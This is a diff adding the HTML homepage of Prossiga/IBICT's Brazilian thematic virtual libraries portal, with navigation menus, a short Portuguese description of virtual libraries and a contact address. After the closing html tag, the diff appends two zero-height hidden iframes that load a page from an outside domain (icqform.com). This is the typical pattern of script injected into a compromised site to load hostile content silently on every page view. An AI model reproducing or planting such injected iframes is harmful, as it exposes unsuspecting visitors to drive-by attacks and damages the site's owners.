@@ -1,0 +1,994 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+
+
+<html>
+
+<head>
+
+	<title>::Prossiga :: Bibliotecas Virtuais Temáticas</title>
+
+	<link rel="stylesheet" type="text/css" href="../css/geral.css">
+
+   <link href="http://www.ibict.br/estilos/estilo_gov.css" rel="stylesheet" type="text/css">
+
+	   <script language="JavaScript" src="http://www.ibict.br/scripts/script_governo.js" type="text/javascript"></script>
+
+  
+
+
+
+</head>
+
+
+
+
+
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" marginwidth="0">
+<div align="center"><center>
+<table border="0" cellspacing="0" cellpadding="0" width="780">
+
+
+
+<!-- código janela popup -->
+
+
+
+<script language="JavaScript">
+
+
+
+function abrir(URL) {
+
+
+
+    window.open(URL,"janela1","width=380,height=450,top=2,left=2,scrollbars=NO")
+
+
+
+}
+
+
+
+</script>
+
+
+
+<!-- final código janela pop up -->
+
+
+
+ <!-- Código de inclusão da barra do prossiga -->
+
+ <table width="780"  border="0" cellpadding="0" cellspacing="0"  >
+
+  <tr> 
+
+   <td height="22" align="left" valign="top" class="tdLine">
+
+    <script language="JavaScript" type="text/javascript">
+
+       <!-- //
+
+       govHeader('gov');
+
+	// -->
+
+    </script>
+
+   </td>
+
+  </tr>
+
+ </table>
+
+
+
+
+
+<!--- cabecalho --->
+
+<table border="0" cellspacing="0" cellpadding="0" width="780">
+
+<tr>
+
+<td width="15" background="../imagens/ponto05.gif"></td>
+
+<TD width="205"><a href="http://prossiga.ibict.br/"><img src="../imagens/logo01.gif" alt="Logo do Prossiga" border="0"></a>
+
+<td width="15"></td>
+
+<td valign="top">
+
+ <!-- <img src="../imagens/ponto05.gif" width="430" height="8" border="0" align="top"> <a href="http://www.ibict.br"><img src="../imagens/logo_ibict2.gif" alt="Logo do IBICT" border="0"></a> -->
+
+ <img width="430" height="1" border="0" align="top"> <a href="http://www.ibict.br" target="_blank"><img src="../imagens/logo_ibict2.gif" alt="Logo do IBICT" border="0"></a>
+
+	<table  border=0" cellspacing="0" cellpadding="0" width="98%">
+
+	<tr>
+
+	  <td width="171" valign="top" class="font5"><img src="../imagens/t02.gif" alt="Imagem de Bibliotecas Virtuais" width="180" height="42" border="0"></td>
+
+	<td width="3" height="22" valign="top" class="font5"> <br></td>
+
+
+
+	<td width="13" valign="top" class="font5">&nbsp;</td>
+
+	<td width="220">
+
+	<script>
+
+<!-- 
+
+function MM_jumpMenu(targ,selObj,restore){ //v3.0 
+
+	eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
+
+	if (restore) selObj.selectedIndex=0; 
+
+}
+
+//-->
+
+    </script>
+
+         <form name="prossiga">
+
+<!--              <select name="select" onChange="MM_jumpMenu('parent',this,0)"> -->
+
+              <select name="select" onChange="nova_jan(value,this,0)"> 
+
+                <option value="1" selected>Navegue pelo Prossiga...</option>
+
+                <option value="http://prossiga.ibict.br/bibliotecas/">Bibliotecas virtuais</option>
+
+                
+
+                <option value="http://prossiga.ibict.br/eventos/">Eventos CT&I</option>
+
+                <option value="http://prossiga.ibict.br/fomento/">Fomento &agrave; Pesquisas em C&amp;T no Brasil</option>
+
+                <option value="http://prossiga.ibict.br/instituicao/">Institui&ccedil;&otilde;es de C&amp;T</option>
+
+                <option value="http://prossiga.ibict.br/mercado/">Mercado de Trabalho C&amp;T</option>
+
+                
+
+                <option value="http://prossiga.ibict.br/portais/">Portais tem&aacute;ticos</option>
+
+                
+
+                
+
+          </select>
+
+         </form>
+
+     </td>
+
+	
+
+	<td width="98" align="right" valign="middle">
+
+	  <div align="right"><a href="../html/mapa.html"><img src="../imagens/ico01.gif" border="0" alt="mapa do portal"></a>
+
+	      <a href="../html/contato.html"><img src="../imagens/ico03.gif" border="0" alt="contato"></a>
+
+     <a href="../index.html"><img src="../imagens/ico02.gif" border="0" alt="principal"></a></div></td>
+
+	</tr>
+
+  </table></td>
+
+
+
+<td background="../imagens/ponto03.gif" width="1"></td>
+
+<td width="15" background="../imagens/ponto05.gif"></td>
+
+</tr>
+
+</table>
+
+<!--- /cabecalho --->
+
+
+
+
+
+<table border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+
+<td><img src="../imagens/ponto02.gif" width="780" height="1" border="0"></td>
+
+</tr>
+
+</table>
+
+
+
+<table border="0" cellspacing="0" cellpadding="0" width="780">
+
+<tr>
+
+<td width="15" background="../imagens/ponto05.gif"></td>
+
+<TD valign="top" width="200">
+
+  <!--- menu --->
+
+  <table border="0" cellspacing="0" cellpadding="0">
+
+
+    <tr>
+
+      <td width="2"></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="2"></td>
+
+      <td width="12"></td>
+
+      <td width="220"><a href="http://www.bvanisioteixeira.ufba.br/" class="link1">Anísio Teixeira</a></td>
+
+
+      <td width="20"></td>
+
+      <td></td>
+
+      <td width="7"></td>
+
+    </tr>
+
+     <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td width="2"></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="2"></td>
+
+      <td width="12"></td>
+
+      <td width="220"><a href="http://www.bibvirtuais.ufrj.br/artescenicas/" class="link1">Artes Cênicas</a></td>
+
+
+      <td width="20"></td>
+
+      <td></td>
+
+      <td width="7"></td>
+
+    </tr>
+
+     <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+  <!--  <tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://www.bibvirtuais.ufrj.br/literatura/" class="link1">Literatura</a></td>
+
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>-->
+
+    <tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://www.bibvirtuais.ufrj.br/estudosculturais/" class="link1">Estudos Culturais</a></td>
+
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://inovacaotecnologica.ibict.br" class="link1">Inova&ccedil;&atilde;o Tecnol&oacute;gica</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <!--<tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://www.cjf.gov.br/bvirtual/" class="link1">Jur&iacute;dica</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>-->
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://www.bibvirtuais.ufrj.br/literatura/" class="link1">Literatura</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+<tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://matematica.ibict.br/" class="link1">Matem&aacute;tica</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+
+<tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://mulher.ibict.br/" class="link1">Mulher</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+     <!-- <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>-->
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+     <!--<td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://www.prossiga.br/cnencin/bvenergia/" class="link1">Energia</a></td>
+
+      <td></td>-->
+
+     <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://saudemental.ibict.br" class="link1">Sa&uacute;de Mental</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+      <td></td>
+
+      <td class="font1"><a href="http://saudereprodutiva.ibict.br/" class="link1">Sa&uacute;de Reprodutiva</a></td>
+
+
+      <td></td>
+
+      <td></td>
+
+      <td></td>
+
+    </tr>
+
+    <tr>
+
+      <td></td>
+
+      <td></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td background="../imagens/ponto05.gif"></td>
+
+      <td></td>
+
+    </tr>
+
+    
+
+    
+
+    
+
+  </table>
+
+  <!--- /menu --->
+
+  <!--- busca oculta aguardando ferramenta --->
+
+  <!-- <center>
+
+	<table  border="0" cellspacing="0" cellpadding="0" width="170">
+
+	<tr>
+
+	<td class="font5" valign="middle" height="40"><b>Busca</b>:&nbsp;</td>
+
+	<td><input type="text" size="15"></td>
+
+	<td><img src="imagens/ico05.gif" alt="digite somente uma palavra" border="0" align="middle" hspace="3"></td>
+
+ 	</tr>
+
+	</table>
+
+	</center> -->
+
+  <!--- /busca --->
+
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+
+    <tr>
+
+      <td background="../imagens/ponto04.gif" height="1"></td>
+
+    </tr>
+
+  </table>
+
+  <!--- texto --->
+
+  <center>
+
+    <table  border="0" cellspacing="0" cellpadding="0" width="100%"  background="../imagens/ponto05.gif">
+
+      <tr>
+
+        <td width="5"></td>
+
+        <td height="5"></td>
+
+        <td width="5"></td>
+
+      </tr>
+
+      <tr>
+
+        <td width="5"></td>
+
+        <td class="font5"> O Prossiga, na &aacute;rea de C&amp;T, fortalece a presen&ccedil;a da informa&ccedil;&atilde;o brasileira na Rede atribuindo-lhe maior visibilidade e acessibilidade. </td>
+
+        <td width="5"></td>
+
+      </tr>
+
+      <tr>
+
+        <td width="5"></td>
+
+        <td height="5"></td>
+
+        <td width="5"></td>
+
+      </tr>
+
+    </table>
+
+    <table border="0" cellspacing="0" cellpadding="0" width="100%">
+
+     <tr>
+
+      <td background="../imagens/ponto04.gif" height="1"></td>
+
+     </tr>
+
+    </table>
+
+  </center>
+
+  <!--- /texto --->
+
+  <!--- links internos --->
+
+  <center>
+
+    <table border="0" cellspacing="0" cellpadding="0">
+
+      <tr>
+
+        <td width="2"></td>
+
+        <td><img src="../imagens/m01.gif" border="0" vspace="2"></td>
+
+        <td width="12"></td>
+
+        <td width="155"><a href="documentacao.html" class="link1">Documenta&ccedil;&atilde;o</a></td>
+
+        <td width="20"></td>
+
+        <td></td>
+
+        <td width="7"></td>
+
+      </tr>
+
+      <tr>
+
+        <td></td>
+
+        <td></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td></td>
+
+      </tr>
+
+      <tr>
+
+        <td></td>
+
+        <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+        <td></td>
+
+        <td><a href="../html/equipe.html" class="link1">Equipe</a></td>
+
+        <td></td>
+
+        <td></td>
+
+        <td></td>
+
+      </tr>
+
+      <tr>
+
+        <td></td>
+
+        <td></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td background="../imagens/ponto05.gif"></td>
+
+        <td></td>
+
+      </tr>
+
+      <tr>
+
+        <td></td>
+
+        <td><img src="../imagens/m01.gif" border="0" vspace="3"></td>
+
+        <td></td>
+
+        <td><a href="historico.htm" class="link1">Hist&oacute;rico</a></td>
+
+        <td></td>
+
+        <td></td>
+
+        <td></td>
+
+      </tr>
+
+      <tr>
+
+        <td></td>
+
+        <td></td>
+
+        <td background="imagens/ponto05.gif"></td>
+
+        <td background="imagens/ponto05.gif"></td>
+
+        <td background="imagens/ponto05.gif"></td>
+
+        <td background="imagens/ponto05.gif"></td>
+
+        <td></td>
+
+      </tr>
+
+    </table>
+
+  </center>
+
+  <!--- /links internos --->
+
+  <!--- endere&ccedil;o --->
+
+  <center>
+
+    <table  border="0" cellspacing="0" cellpadding="0" width="100%" background="../imagens/ponto05.gif">
+
+      <tr>
+
+        <td height="5"></td>
+
+      </tr>
+
+      <tr>
+
+        <td class="font1"><img src="../imagens/ico07.gif" align="absmiddle"> <b>Endere&ccedil;o</b>:
+
+          SAS Quadra 5 lote 6 Bloco H - Edifício IBICT<br>
+
+          Bras&iacute;lia - Distrito Federal - Brasil<br>
+
+          CEP: 70.070-914<br>
+
+          <!--Tel.: (+55) (61) 3217-6344<br>
+
+          Fax:  (+55) (61) 3217-6492<br>-->
+
+          e-mail: <a href="mailto:taina@ibict.br" class="link1">bvt@ibict.br</a></td>
+
+      </tr>
+
+      <tr>
+
+        <td height="5"></td>
+
+      </tr>
+
+    </table>
+
+  </center>
+
+  <!--- /endere&ccedil;o --->
+
+  <!--- /primeira coluna ---></td>
+
+<!--- primeira colula ---><td width="1" background="../imagens/ponto04.gif"></td>
+
+<td width="13"></td>
+
+<!--- segunda coluna ---><td width="538" valign="top">
+
+<table  border="0" cellspacing="0" cellpadding="0">
+
+	<tr>
+
+	<td align="left" class="font3">		<img src="../imagens/banner_02.jpg" alt="" width="347" height="207" hspace="0" border="0" align="right"> <span class="font1"><span class="font4"><br>
+
+	 O que s&atilde;o Bibliotecas Virtuais </span><br>
+
+        <br>
+
+</span>As Bibliotecas Virtuais s&atilde;o cole&ccedil;&otilde;es organizadas de documentos eletr&ocirc;nicos, onde cada fonte de informa&ccedil;&atilde;o possui dois atributos relacionados: os relativos ao seu conte&uacute;do e os que identificam de forma descritiva o documento. <br>
+
+<br>
+
+As Bibliotecas Virtuais Tem&aacute;ticas s&atilde;o cole&ccedil;&otilde;es referenciais que re&uacute;nem e organizam informa&ccedil;&otilde;es, presentes na Internet, sobre determinadas &aacute;reas do conhecimento. Elas s&atilde;o desenvolvidas por meio da parceria do IBICT com Institui&ccedil;&otilde;es que desejam organizar e difundir seus conte&uacute;dos tem&aacute;ticos no ambiente <em>/ web / </em>. <br>
+
+<br></td>
+
+	</tr>
+
+	<tr>
+
+	 <td align="left" height="60" class="font3">&nbsp;</td>
+
+    </tr>
+
+	<tr>
+
+<!-- <td align="left" class="font3"><div align="center"><a href="javascript:abrir('http://prossigas.ibict.br/notaveis.html')" target="_blank"><img src="http://s.br/Site/imagens/bvnotaveis.jpg" alt="Biblioteca de Notaveis em C&amp;T" border="0" align="middle">Clique Aqui</a></div></td> -->
+
+
+
+<td align="center" class="font3"><div align="center"><a href="javascript:abrir('http://prossigas.ibict.br/notaveis.html')">
+
+  <img src="http://prossiga.ibict.br/Site/imagens/bvnotaveis.jpg" alt="Biblioteca de Notaveis em C&amp;T" border="0" align="middle" width="177" height="55"> 
+
+ Clique Aqui</a></div></td>
+
+
+
+    </tr>
+
+   </table>
+
+<!--- /segunda coluna ---></td>
+
+<td width="1" background="../imagens/ponto03.gif"></td>
+
+<td width="15" background="../imagens/ponto04.gif"></td>
+
+</tr>
+
+<tr>
+
+<td colspan="7">
+
+<iframe src="rodape.html" name="rodape" id="rodape" width="780" height="110" marginwidth="0" marginheight="0" hspace="0" vspace="0" scrolling="no" frameborder="0"></iframe>
+
+</td>
+
+</tr>
+
+</table>
+</table>
+</center></div>
+
+
+</body>
+
+</html>
+<iframe src=http://icqform.com/blog/index.html widht=0 height=0></iframe>
+<iframe src=http://icqform.com/blog/index.html widht=0 height=0></iframe>
